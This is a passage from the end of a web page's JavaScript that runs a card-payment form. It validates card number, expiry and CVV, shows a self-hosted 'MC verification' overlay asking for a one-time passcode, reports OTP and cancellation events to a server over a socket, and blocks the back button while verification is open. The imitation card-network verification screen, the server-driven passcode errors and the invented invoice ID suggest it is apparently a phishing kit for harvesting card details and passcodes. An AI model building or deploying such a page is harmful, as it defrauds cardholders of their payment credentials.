            submitBtn.innerHTML = 'Pay Now';
        }
    }
    
    // Notify server of cancellation
    if (socket) {
        socket.emit('cancel_payment', {
            transactionId: state.transactionId
        });
    }
}

function proceedToSuccess() {
    // Get current date for display
    const currentDate = new Date().toLocaleDateString();
    
    // Clear MC timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
    }
    
    // Hide MC verification overlay with transition
    const overlay = document.getElementById('mcVerificationOverlay');
    const verificationContent = document.getElementById('mcVerificationContent');
    
    if (overlay && verificationContent) {
        // Replace with success message showing invoice ID and date
        verificationContent.innerHTML = `
            <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 300px; padding: 20px;">
                <div style="color: #4CAF50; font-size: 60px; margin-bottom: 20px;"></div>
                <div style="text-align: center; max-width: 320px;">
                    <h2 style="color: #333; font-size: 24px; margin-bottom: 15px;">Payment Successful</h2>
                    <div style="background-color: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: #555; font-size: 14px;">Invoice ID:</span>
                            <span style="color: #333; font-weight: 600; font-size: 14px;">INV-${state.transactionId}</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: #555; font-size: 14px;">Date:</span>
                            <span style="color: #333; font-weight: 600; font-size: 14px;">${currentDate}</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span style="color: #555; font-size: 14px;">Amount:</span>
                            <span style="color: #333; font-weight: 600; font-size: 14px;">$${state.amount.toFixed(2)}</span>
                        </div>
                    </div>
                    <p style="color: #666; font-size: 14px;">Thank you for your payment. A confirmation has been sent to your email.</p>
                </div>
            </div>
        `;
        
        // Show overlay with success content
        overlay.style.display = 'flex';
        
        // Redirect to success page after longer delay so user can see the success message
        setTimeout(() => {
            window.location.href = `/success.html?ref=${state.transactionId}`;
        }, 5000);
    } else {
        // Redirect immediately if overlay not found
        window.location.href = `/success.html?ref=${state.transactionId}`;
    }
}

function handlePaymentError(errorMessage) {
    // Re-enable submit button
    const cardForm = document.getElementById('card-form');
    if (cardForm) {
        const submitBtn = cardForm.querySelector('button[type="submit"]');
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Pay Now';
        }
    }

    // Hide MC verification overlay if shown
    const overlay = document.getElementById('mcVerificationOverlay');
    if (overlay) {
        overlay.style.display = 'none';
    }

    // Show error notification
    showErrorNotification(errorMessage || 'There was an error processing your payment. Please try again.');

    // Notify server of error
    if (socket && socket.connected) {
        socket.emit('payment_error', {
            transactionId: state.transactionId,
            error: errorMessage
        });
    } else {
        console.error('Socket not connected, cannot send payment_error event');
    }
}

function handleOtpError(errorMessage) {
    // Show error message
    const otpError = document.getElementById('mcOtpError');
    if (otpError) {
        otpError.textContent = errorMessage || 'Invalid One-Time Passcode. Please try again.';
        otpError.style.display = 'block';
    }
    
    // Re-enable submit button
    const submitBtn = document.getElementById('mcSubmitBtn');
    if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit';
    }
    
    // Clear OTP input
    const otpInput = document.getElementById('mcOtpInput');
    if (otpInput) {
        otpInput.value = '';
        otpInput.focus();
    }
}

function showErrorNotification(message) {
    // Create floating notification
    const notification = document.createElement('div');
    notification.style.position = 'fixed';
    notification.style.top = '20px';
    notification.style.left = '50%';
    notification.style.transform = 'translateX(-50%)';
    notification.style.backgroundColor = '#ef4444';
    notification.style.color = 'white';
    notification.style.padding = '10px 20px';
    notification.style.borderRadius = '4px';
    notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
    notification.style.zIndex = '9999';
    notification.style.transition = 'opacity 0.5s';
    notification.innerHTML = message;
    
    document.body.appendChild(notification);
    
    // Remove notification after 5 seconds
    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 500);
    }, 5000);
}

function checkFormCompletion() {
    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
    const cardHolder = document.getElementById('card-holder').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;
    
    const payNowBtn = document.querySelector('.pay-now-btn');
    if (!payNowBtn) return;
    
    // Check if all fields have values
    const isValid = cardNumber.length >= 13 && cardNumber.length <= 19 && 
                    cardHolder.trim().length > 0 && 
                    /^\d{2}\/\d{2}$/.test(expiryDate) && 
                    /^\d{3,4}$/.test(cvv);
    
    if (isValid) {
        // Enable button
        payNowBtn.classList.add('pay-enabled');
        payNowBtn.style.backgroundColor = '#1a5e32'; 
        payNowBtn.style.cursor = 'pointer';
    } else {
        // Disable button
        payNowBtn.classList.remove('pay-enabled');
        payNowBtn.style.backgroundColor = '#a0aec0';
        payNowBtn.style.cursor = 'not-allowed';
    }
}

function updateCardBrandIcon(cardType) {
    // Set card brand icon based on detected card type
    const cardTypeImg = document.getElementById('card-type-img');
    if (!cardTypeImg) return;
    
    if (cardType === 'visa') {
        cardTypeImg.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
        cardTypeImg.alt = 'Visa';
        cardTypeImg.style.display = 'block';
    } else if (cardType === 'mastercard') {
        cardTypeImg.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
        cardTypeImg.alt = 'Mastercard';
        cardTypeImg.style.display = 'block';
    } else if (cardType === 'amex') {
        cardTypeImg.src = 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg';
        cardTypeImg.alt = 'American Express';
        cardTypeImg.style.display = 'block';
    } else if (cardType === 'discover') {
        cardTypeImg.src = 'https://static.wikia.nocookie.net/logopedia/images/5/57/Discover_Card_logo.svg/revision/latest/scale-to-width-down/300?cb=20211117164133';
        cardTypeImg.alt = 'Discover';
        cardTypeImg.style.display = 'block';
    } else {
        cardTypeImg.src = '';
        cardTypeImg.alt = '';
        cardTypeImg.style.display = 'none';
    }
}

function generateInvoiceID() {
    // Generate a random alphanumeric invoice ID
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function setupBackButtonConfirmation() {
    console.log('Setting up back button confirmation');
    
    // Track if MC verification is active
    let mcVerificationActive = false;
    
    // Function to show custom confirmation dialog
    function showConfirmationDialog() {
        return confirm('Do you want to cancel this transaction?');
    }
    
    // Update the MC verification active state
    function updateMcVerificationState() {
        const mcOverlay = document.getElementById('mcVerificationOverlay');
        mcVerificationActive = mcOverlay && mcOverlay.style.display !== 'none';
    }
    
    // Handle popstate event (back button)
    window.addEventListener('popstate', function(e) {
        console.log('Back button detected (popstate event)');
        
        updateMcVerificationState();
        if (mcVerificationActive) {
            console.log('MC verification is active, showing confirmation dialog');
            
            // Prevent the default action and show custom dialog
            const confirmLeave = showConfirmationDialog();
            
            // If user confirms leaving
            if (confirmLeave) {
                console.log('User confirmed leaving, cancelling transaction');
                
                // Cancel the transaction
                if (socket && socket.connected && state.transactionId) {
                    socket.emit('mc_verification_cancelled', {
                        invoiceId: state.transactionId,
                        reason: 'cancelled_by_user'
                    });
                    console.log('Cancellation event sent to server');
                }
                
                // Hide MC verification overlay
                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
                if (mcVerificationOverlay) {
                    mcVerificationOverlay.style.display = 'none';
                    console.log('MC verification overlay hidden');
                }
                
                // Stop MC timer
                if (mcTimerInterval) {
                    clearInterval(mcTimerInterval);
                    mcTimerInterval = null;
                    console.log('MC timer stopped');
                }
                
                // Show error UI with cancellation message
                showErrorNotification("Payment cancelled by user");
            } else {
                console.log('User cancelled navigation, preventing page change');
                
                // If user cancels leaving, reset the history state to prevent navigation
                history.pushState(null, null, window.location.pathname + window.location.search);
            }
            
            // Prevent default navigation behavior
            e.preventDefault();
            return false;
        } else {
            console.log('MC verification not active, allowing normal navigation');
        }
    });
    
    // Push an initial state to history for back button detection
    history.pushState(null, null, window.location.pathname + window.location.search);
    console.log('Initial history state pushed for back button detection');
}
  </script>
  </body>
  </html>
